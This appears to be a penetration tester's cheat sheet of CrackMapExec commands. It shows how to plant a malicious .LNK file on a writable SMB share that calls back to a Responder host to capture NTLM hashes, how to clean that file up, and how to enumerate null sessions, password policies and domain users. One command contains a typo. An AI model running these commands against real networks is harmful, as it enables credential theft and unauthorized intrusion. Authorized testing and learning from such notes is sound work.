---
description: Examples of CrackMapExec commands that I use throughout penetration tests.
---

# CrackMapExec Examples

## Harvest NTLMv2/v1 credentials if you have write-access to a share.

Enumerate the hosts shares\
`crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] --shares`

Create a malicious .LNK file calling back to your Responder.py IP\
`crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP]`

After waiting and (hopefully) obtaining several NTLM hashes, cleanup the malicious file\
`rackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP] CLEANUP=True`

## Null Session Enumeration

Enumerate null sessions\
`cme smb [TARGETS] -u '' -p ''`

Enumerate password policy (domain controller)\
`cme smb [TARGET] --pass-pol`

Enumerate users (domain controller)\
`cme smb [TARGET] --users`

## References

* [Harvest\_NTLM\_with\_Slinky](https://twitter.com/mpgn\_x64/status/1453018750253424643)
* [Enumerate\_Null\_Sessions](https://mpgn.gitbook.io/crackmapexec/smb-protocol/enumeration/enumerate-null-sessions)
